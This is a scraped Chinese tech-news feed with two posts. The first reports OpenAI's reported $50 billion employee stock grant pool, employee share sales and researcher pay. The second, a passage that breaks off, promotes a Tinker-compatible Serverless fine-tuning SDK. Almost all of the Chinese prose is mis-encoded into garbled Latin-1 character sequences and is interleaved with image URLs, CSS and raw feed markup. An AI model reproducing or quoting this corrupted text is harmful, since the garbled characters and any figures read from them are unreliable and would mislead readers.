<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c3f1604b23a47e2b869567e0553300b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=ZglNFieJUfRIIzlr5EI6b5pcaMc%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒOpenAI è¢«é€¼æ€¥ã€</strong></p>
<p><strong>ã€Œè±ªæ· 500 äº¿ç¾å…ƒç»™å‘˜å·¥ã€</strong></p>
<p>çœ¼çœ‹ç€è‡ªå·±å°±è¦è¢«è½ä¸‹ï¼ŒOpenAI æœ€è¿‘ä¹Ÿæ˜¯å¹²è„†æ‹¿å‡ºæœ€åä¸€æ‹›â€”â€”ç ¸é’±æŠ¢äººï¼</p>
<p>å¤–åª’ The Information çˆ†æ–™ï¼Œ<strong>ã€ŒOpenAI åœ¨å»å¹´ç§‹å¤©æ‚„æ‚„é¢„ç•™äº†ä¸€ç¬”é«˜è¾¾ 500 äº¿ç¾å…ƒçš„å‘˜å·¥è‚¡ç¥¨æˆäºˆæ± ã€</strong>ï¼Œå å…¬å¸æ€»è‚¡æœ¬çš„ <strong>ã€Œ10%ã€</strong>ã€‚</p>
<p>æŒ‰å½“æ—¶ **ã€Œ5000 äº¿ç¾å…ƒä¼°å€¼ã€**è®¡ç®—ï¼Œè¿™æ˜¯ä¸€ç¬”çœŸæ­£æ„ä¹‰ä¸Šçš„ã€Œå¤©ä»·æ¿€åŠ±ã€ã€‚</p>
<p>500 äº¿ç¾å…ƒï¼Œæ˜¯ä»€ä¹ˆæ¦‚å¿µï¼Ÿ</p>
<p>æ³¨æ„ï¼Œè¿™ç¬”é’±å¯ä¸æ˜¯ã€Œæœªæ¥å¯èƒ½å€¼è¿™ä¹ˆå¤šã€ï¼Œè€Œæ˜¯**ã€Œå·²ç»æŒ‰ä¼°å€¼ç®—æ¸…æ¥šã€ç›´æ¥åˆ’å‡ºæ¥çš„è‚¡ç¥¨æ± ã€**ã€‚</p>
<p>å½¢å¼æ˜¯å—é™è‚¡ç¥¨å•ä½ï¼ˆRSUï¼‰ï¼Œä½¿ç”¨å‘¨æœŸçº¦ <strong>ã€Œ5 å¹´ï¼Œå¹¶ä¸”ã€<strong>éšç€ä¼°å€¼ä¸Šæ¶¨ï¼Œ</strong>ã€Œç†è®ºä¸Šè¿˜ä¼šç»§ç»­å‡å€¼ï¼ã€</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d1e2f916d74444291117ffb00872c7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=%2FQwprCksH53yha9JEc2BZw51piU%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥è¯´ï¼Œæ”¾åœ¨æ•´ä¸ªç§‘æŠ€è¡Œä¸šé‡Œï¼Œè¿™ä¸ªæ•°å­—éƒ½æä¸å¯»å¸¸ã€‚</p>
<p>æ¯”å¦‚ Meta å§ï¼Œå®ƒåœ¨ 2020 å¹´åˆ° 2025 å¹´åº•ï¼Œæ•´æ•´äº”å¹´æ—¶é—´é‡Œï¼Œ<strong>ã€Œç”¨äºè‚¡ç¥¨è–ªé…¬çš„æ€»æ”¯å‡ºæ‰æ˜¯ 660 äº¿ç¾å…ƒã€</strong>ã€‚</p>
<p>ç„¶è€Œï¼ŒMeta å¹´è¥æ”¶å¯æ˜¯ OpenAI çš„ 15 å€ã€‚</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8be58e6d04a74ad6b6d811ac3a46dd48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=CNDvO5S2kNXJwUVtrjHdkhB1lRw%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€ŒçœŸé‡‘ç™½é“¶å¥—ç°ã€</strong></p>
<p>ä½ æˆ–è®¸è®¤ä¸ºï¼Œè¿™ 500 äº¿ç¾å…ƒåªæ˜¯åœ¨ã€Œç”»é¥¼ã€ï¼Ÿ</p>
<p>æ›´ç‚¸è£‚çš„æ¥äº†ï¼šæˆªè‡³ç›®å‰ï¼Œ<strong>ã€ŒOpenAI å·²ç»å‘å‘˜å·¥å‘æ”¾äº†çº¦ 800 äº¿ç¾å…ƒçš„å·²å½’å±è‚¡æƒã€‚ã€</strong></p>
<p>è€Œä¸”ä»…ä»…åœ¨**ã€Œå»å¹´ä¸€å¹´ã€<strong>ï¼Œå‘˜å·¥å°±å‡ºå”®äº†</strong>ã€Œçº¦ 100 äº¿ç¾å…ƒã€**çš„è‚¡ä»½ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53ea263c8b464567acbbb0aab8e2c3c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=9VVpZ%2FqhZzTXwQjB17Cjt7JfKVg%3D" alt="" loading="lazy"/></p>
<p>æ³¨æ„ï¼Œè¿™äº›å¯æ˜¯å·²è½è¢‹çš„çœŸé‡‘ç™½é“¶ã€‚</p>
<p>å¯¹äºä¸€å®¶æˆç«‹åªæœ‰ 10 å¹´çš„å…¬å¸ï¼Œè¿™ç§ä½“é‡çš„å‘˜å·¥å¥—ç°ï¼Œåœ¨æ•´ä¸ªç§‘æŠ€å²ä¸Šï¼Œéƒ½æä¸ºç½•è§ã€‚</p>
<p>å»å¹´ç§‹å¤©ï¼ŒOpenAI å®Œæˆäº†ä¸€æ¬¡å…³é”®çš„å…¬å¸æ¶æ„é‡ç»„ï¼šå°†åŒ…æ‹¬**ã€Œå¾®è½¯åœ¨å†…çš„åˆ©æ¶¦åˆ†æˆå•ä½ï¼Œ**ã€Œè½¬æ¢ä¸ºã€<strong>ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„è‚¡ç¥¨ã€‚ã€</strong></p>
<p>è¿™æ¬¡é‡ç»„å®Œæˆåï¼Œå·²å½’å±å‘˜å·¥è‚¡æƒï¼ˆçº¦ 800 äº¿ç¾å…ƒï¼‰å’Œæœªæ¥å‘˜å·¥è‚¡ç¥¨æˆäºˆæ± ï¼ˆ500 äº¿ç¾å…ƒï¼‰ï¼Œ<strong>ã€Œåˆè®¡å å…¬å¸è‚¡ä»½çš„ 26%ã€‚ã€</strong></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>ã€Œä¸€æ¬¡é‡ç»„ä¹‹åï¼Œå‘˜å·¥æ‹¿èµ°äº† 26% çš„å…¬å¸ã€‚ã€</strong></p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6972c91d963a4a77b279f189f41fa656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=Xvh9utwPBhw7fUVE0fCru7GsSxk%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€ŒIlya èº«ä»·æ›å…‰ï¼š40 äº¿ç¾é‡‘ã€</strong></p>
<p>è€Œä¸”ï¼Œè¿™è¿˜æ²¡å®Œã€‚</p>
<p>ç›®å‰ï¼ŒOpenAI æ­£åœ¨å’ŒæŠ•èµ„äººè°ˆåˆ¤æ–°ä¸€è½®èèµ„ï¼Œèèµ„è§„æ¨¡æœ€é«˜ 1000 äº¿ç¾å…ƒã€‚å¦‚æœäº¤æ˜“è¾¾æˆï¼Œ<strong>ã€Œè¿™ 500 äº¿ç¾å…ƒçš„å‘˜å·¥è‚¡ç¥¨æ± ï¼Œå°†ç«‹åˆ»æ°´æ¶¨èˆ¹é«˜ã€‚ã€</strong></p>
<p>å…¬å¸å†…éƒ¨è¿˜é¢„æµ‹ï¼Œåˆ° 2030 å¹´ï¼Œæ¯å¹´çš„è‚¡ç¥¨è–ªé…¬æ”¯å‡ºä¼šæ¥è¿‘ 210 äº¿ç¾å…ƒï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8759c15c76734a0bad527ed879bb15cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=mC1KR342mUwBetQl4qdrxTJJlnk%3D" alt="" loading="lazy"/></p>
<p>ä¸ºä»€ä¹ˆå¿…é¡»çƒ§è¿™ä¹ˆå¤šé’±ï¼ŸåŸå› å°±æ˜¯ï¼Œäººæ¯”ç®—åŠ›æ›´ç¨€ç¼ºã€‚</p>
<p>åœ¨é€šå¾€ AGI çš„è·¯ä¸Šï¼Œç¼ºçš„ä¸æ˜¯ GPUï¼Œè€Œæ˜¯èƒ½è®¾è®¡ä¸‹ä¸€ä»£æ¨¡å‹æ¶æ„ã€çªç ´ Scaling Law è¾¹ç•Œçš„äººã€‚</p>
<p>å»å¹´ï¼Œ<strong>ã€ŒMeta ç”¨ã€Œå¤©ä»·è–ªé…¬ + å·¨é¢è‚¡æƒã€ä» OpenAI å’Œå…¶ä»–å…¬å¸æŒ–èµ°å¤šåæ ¸å¿ƒç ”ç©¶å‘˜ã€</strong>ï¼Œä»…ç­¾çº¦å¥–é‡‘å’Œæ¿€åŠ±å°±èŠ±äº†æ•°äº¿ç¾å…ƒã€‚</p>
<p>è€Œ OpenAI è”åˆ›ã€å‰é¦–å¸­ç§‘å­¦å®¶ Ilya åœ¨ 2023 å¹´åº•ï¼Œå°±æŒæœ‰å¤§çº¦ 40 äº¿ç¾å…ƒçš„å·²å½’å±è‚¡æƒã€‚</p>
<p>è¿™ä¸ªæ—¶ä»£ï¼Œé¡¶çº§ç ”ç©¶å‘˜å¯ä¸ä»…ä»…æ˜¯å‘˜å·¥ï¼Œè€Œæ˜¯è‡ªå¸¦ä¼°å€¼çš„èµ„äº§ã€‚</p>
<p>å½“ç„¶ï¼ŒOpenAI çš„æŠ•èµ„äººå¿ƒå¤´å´ç¬¼ç½©ç€é˜´å½±ã€‚åŸå› åœ¨äºï¼Œå®ƒè¿˜åœ¨æ¯å¹´çƒ§æ‰æ•°åäº¿ç¾å…ƒç°é‡‘ã€‚</p>
<p>å…¶å® OpenAI è¿™å¥—æ‰“æ³•ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨èµŒä¸€ä»¶äº‹ï¼š<strong>ã€Œåªè¦èƒ½æŠ¢åˆ°æœ€é¡¶çº§çš„äººï¼Œç¨€é‡Šã€äºæŸã€çƒ§é’±ï¼Œç»Ÿç»Ÿéƒ½å¯ä»¥å…ˆæ”¾ä¸€è¾¹ã€‚ã€</strong></p>
<p>åœ¨ AGI çš„ç«èµ›é‡Œï¼Œè¾“æ‰äººæ‰å°±æ˜¯æå‰å‡ºå±€ã€‚è¿™åœºæˆ˜äº‰ä¸æ˜¯ä»€ä¹ˆã€Œç™¾ä¸‡å¹´è–ªã€çš„é—®é¢˜ï¼Œèµ·æ­¥ä»·ï¼Œå°±æ˜¯ 500 äº¿ç¾å…ƒã€‚</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theinformation.com%2Farticles%2Fopenai-reserves-50-billion-stock-grant-pool%3Frc%3Depv9gi" target="_blank" title="https://www.theinformation.com/articles/openai-reserves-50-billion-stock-grant-pool?rc=epv9gi" ref="nofollow noopener noreferrer">www.theinformation.com/articles/opâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theinformation.com%2Fbriefings%2Fgoogle-passes-apple-become-second-valuable-company%3Frc%3Depv9gi" target="_blank" title="https://www.theinformation.com/briefings/google-passes-apple-become-second-valuable-company?rc=epv9gi" ref="nofollow noopener noreferrer">www.theinformation.com/briefings/gâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FSimilarweb%2Fstatus%2F2008805674893939041" target="_blank" title="https://x.com/Similarweb/status/2008805674893939041" ref="nofollow noopener noreferrer">x.com/Similarweb/â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wsj.com%2Ftech%2Fai%2Fgoogle-ai-openai-gemini-chatgpt-b766e160%3Fmod%3Dai_trendingnow_article_pos1" target="_blank" title="https://www.wsj.com/tech/ai/google-ai-openai-gemini-chatgpt-b766e160?mod=ai_trendingnow_article_pos1" ref="nofollow noopener noreferrer">www.wsj.com/tech/ai/gooâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1 äººé¡¶ 1 ä¸ª Infra å›¢é˜Ÿï¼OpenAI å‰ CTO æ–°æ‹›ï¼Œè®©å¤§æ¨¡å‹è®­ç»ƒè·Œæˆç™½èœä»·]]></title>    <link>https://juejin.cn/post/7592811397505269811</link>    <guid>https://juejin.cn/post/7592811397505269811</guid>    <pubDate>2026-01-08T10:20:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592811397505269811" data-draft-id="7592818272153321499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1 äººé¡¶ 1 ä¸ª Infra å›¢é˜Ÿï¼OpenAI å‰ CTO æ–°æ‹›ï¼Œè®©å¤§æ¨¡å‹è®­ç»ƒè·Œæˆç™½èœä»·"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2026-01-08T10:20:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1 äººé¡¶ 1 ä¸ª Infra å›¢é˜Ÿï¼OpenAI å‰ CTO æ–°æ‹›ï¼Œè®©å¤§æ¨¡å‹è®­ç»ƒè·Œæˆç™½èœä»·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:20:15.000Z" title="Thu Jan 08 2026 10:20:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9dd8ab23d5d465288b42baf1cbfe6b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=%2FTQjmaHLrWribi538jxkjLeWu1E%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘å½“å¤§æ¨¡å‹ç«äº‰è½¬å‘åè®­ç»ƒï¼Œç»§ç»­ä¸ºé—²ç½®æ˜¾å¡çƒ§é’±æ— å¼‚äºã€Œæ…¢æ€§è‡ªæ€ã€ã€‚å¦‚ä»Šï¼ŒæŒ‰ Token è®¡è´¹çš„ Serverless æ¨¡å¼ï¼Œå½»åº•ç»ˆç»“äº†ç®—åŠ›ç§Ÿèµçš„æš´åˆ©æ—¶ä»£ï¼Œè®©ç®—æ³•å·¥ç¨‹å¸ˆçœŸæ­£æ‹¥æœ‰äº†å®šä¹‰ç‰©ç†ä¸–ç•Œçš„æƒåˆ©ã€‚ã€</strong></h5>
<p>å¤§æ¨¡å‹è®­ç»ƒï¼Œæ­£ä»ã€Œä½œåŠç‚¼ä¸¹ã€è¿›åŒ–ä¸ºã€Œå·¥ä¸šå¾®è°ƒã€ï¼</p>
<p>å½“ OpenAI å‰ CTO Mira Murati åˆ›ç«‹çš„ Thinking Machines Lab æ¨å‡º Tinker æ—¶ï¼Œä¸€åˆ‡éƒ½å˜äº†ã€‚</p>
<p>é€šè¿‡å°†è®­ç»ƒæ‹†è§£ä¸º forwardã€backward ç­‰â¼€ç³»åˆ—åŸºæœ¬åŸè¯­ï¼Œç®—æ³•è®¾è®¡ç»ˆäºä¸å†å—é™äºåŸºç¡€è®¾æ–½ã€‚</p>
<p>ç°åœ¨ï¼Œè®­ç»ƒå¤§æ¨¡å‹å°±åƒã€Œå‡½æ•°è°ƒç”¨ã€ä¸€æ ·ç®€å•ã€‚</p>
<p><strong>ã€Œç´§è·Ÿå‰æ²¿ï¼Œæ½æ™¨äº‘å¾®è°ƒã€</strong> <strong>ã€ŒSDKã€</strong> <strong>ã€Œæ­£å¼å‘å¸ƒï¼ã€</strong></p>
<p>è¿™æ˜¯å›½å†…é¦–ä¸ªå…¼å®¹ Tinker èŒƒå¼ã€ä¸”å…¨é¢å¼€æ”¾çš„ Serverless å¾®è°ƒå¹³å°ã€‚</p>
<p>é’ˆå¯¹å¤æ‚ä¸”æ˜‚è´µçš„å¼ºåŒ–å­¦ä¹ ï¼Œç»™å‡ºäº†æ›´å…·æˆæœ¬ä¼˜åŠ¿çš„å·¥ä¸šçº§è§£æ³•ï¼š</p>
<ul>
<li><strong>ã€Œé›¶é—¨æ§›ã€</strong>ï¼šå¼€å‘è€…æ— éœ€å›¤ç§¯æ˜¾å¡ã€‚</li>
<li><strong>ã€Œå…¨é€æ˜ã€</strong>ï¼šRollout â†’ Reward â†’ Updateï¼Œå…¨æµç¨‹æŒ‰ Token è®¡ä»·ã€‚</li>
<li><strong>ã€Œæé«˜æ•ˆã€</strong>ï¼šæ‹’ç»ç®—åŠ›æµªè´¹ï¼Œè®©æ¯ä¸€åˆ†é’±éƒ½èŠ±åœ¨äº§ç”Ÿæ¢¯åº¦çš„ã€Œåˆ€åˆƒã€ä¸Šã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48375f98282545d4b431a1880032f182~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=Wn9NiNWm1DERDM9JlXv7NdXLUT4%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œæ‹¥æŠ±åè®­ç»ƒä¸ RLã€</strong></p>
<p><strong>ã€Œç®—æ³•å±‚ä¸åº•å±‚ç®—åŠ›æ¶æ„çš„è§£è€¦ã€</strong></p>
<p>éšç€ OpenAI o1 åœ¨æ¨ç†èƒ½åŠ›ä¸Šçš„çªç ´ï¼Œä¸šç•Œé€æ¸å½¢æˆå…±è¯†ï¼š</p>
<p>å¤§æ¨¡å‹çš„èƒ½åŠ›çªç ´å·²ä¸å†å•çº¯ä¾èµ–é¢„è®­ç»ƒï¼ˆPre-trainingï¼‰é˜¶æ®µçš„å‚æ•°å †ç Œï¼Œåè®­ç»ƒï¼ˆPost-Trainingï¼‰ç‰¹åˆ«æ˜¯å¼ºåŒ–å­¦ä¹ æ­£æˆä¸ºå†³å®šæ¨¡å‹å®ç”¨ä»·å€¼çš„æ ¸å¿ƒæˆ˜åœºã€‚</p>
<p>ä»¥ DeepSeekâ€‘R1 ä¸ºä¾‹ï¼Œä»…é å¼ºåŒ–å­¦ä¹ è®­ç»ƒï¼Œæ¨¡å‹åœ¨ AIME æ•°å­¦æ¨ç†åŸºå‡†ä¸Šçš„ pass@1 ä» 15.6% æå‡è‡³ 77.9%ï¼Œå……åˆ†å±•ç¤ºäº† RL åœ¨ä½æ•°æ®é‡æ¡ä»¶ä¸‹å³å¯å®ç°å¤§å¹…èƒ½åŠ›è·ƒå‡ï¼Œè¿…é€Ÿæˆä¸ºåè®­ç»ƒèµ›é“çš„æ–°èŒƒå¼ã€‚</p>
<p>ç„¶è€Œï¼Œæ‘†åœ¨ç®—æ³•å·¥ç¨‹å¸ˆé¢å‰çš„é—®é¢˜ä¾æ—§ä¸¥å³»ã€‚</p>
<p>å¼ºåŒ–å­¦ä¹ æ¶‰åŠåˆ°æ›´ä¸ºå¤æ‚çš„ç³»ç»Ÿè®¾è®¡ï¼Œè®­ç»ƒè¿‡ç¨‹ä¸­å­˜åœ¨ä¸€ç³»åˆ—çš„é—®é¢˜ï¼Œå¦‚å¤šä¸ªæ¨¡å‹çš„ä¼˜åŒ–ï¼Œæ•°æ®çš„ä¼ é€’ï¼Œä»¥åŠæ¨¡å‹æƒé‡çš„ä¼ é€’ï¼›ä¸€ç³»åˆ—å·¥ç¨‹åŒ–çš„å·¥ä½œï¼Œç»™ç®—æ³•çš„è®¾è®¡å¸¦æ¥äº†æ›´å¤šçš„å›°éš¾ï¼ŒåŒæ—¶ä¹Ÿå¯¹åŸºç¡€è®¾æ–½æå‡ºäº†æ›´é«˜çš„è¦æ±‚ã€‚</p>
<p>Tinker çš„å‡ºç°ï¼Œå°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼š<strong>ã€ŒæŠŠç¹æ‚è®­ç»ƒå˜æˆæ ‡å‡†æ˜“ç”¨çš„ã€</strong> <strong>ã€ŒAPIã€****ã€‚</strong></p>
<p>æ½æ™¨äº‘æŠŠè¿™ä¸€èŒƒå¼å†™è¿›åº•å±‚å‡è®¾ï¼Œ<strong>ã€Œç®—æ³•****è®¾è®¡ä¸åŸºç¡€è®¾æ–½è§£è€¦ã€</strong>â€”â€”</p>
<p>å¼€å‘è€…åªè´Ÿè´£å®šä¹‰æ•°æ®ä¸ Loss å‡½æ•°ï¼Œåº•å±‚çš„å¼‚æ„é›†ç¾¤è°ƒåº¦ã€å¹¶è¡Œç­–ç•¥ä¼˜åŒ–ã€å®¹é”™è¿ç»´ç­‰åº”è¢«å°è£…ä¸ºåŸºç¡€è®¾æ–½æœåŠ¡ï¼Œå¯¹å¼€å‘è€…å®ç°å…¨æ‰˜ç®¡ä¸æ— æ„Ÿæ”¯æŒã€‚</p>
<p><strong>ã€Œè‡´æ•¬åˆ›æ–°ï¼Œæ›´è‡´åŠ›äº</strong>ã€Œ<strong>ã€Œè½åœ°ã€</strong>ã€<strong>ã€‚ã€</strong></p>
<p>æ½æ™¨äº‘å¾®è°ƒ SDKï¼Œç›´æ¥å…¼å®¹ Tinker æ¥å£ã€‚</p>
<p>å®ƒåœ¨ã€Œé›¶ä»£ç ã€ä¸ã€Œè£¸æœºæ‰‹å†™ã€ä¹‹é—´ï¼Œæ‰¾åˆ°äº†æœ€ä½³å¹³è¡¡ç‚¹ã€‚ä»æ­¤ï¼Œä»ç®—æ³•çµæ„Ÿåˆ°æ¨¡å‹è½åœ°ï¼Œå†æ— å·¥ç¨‹å£å’ã€‚</p>
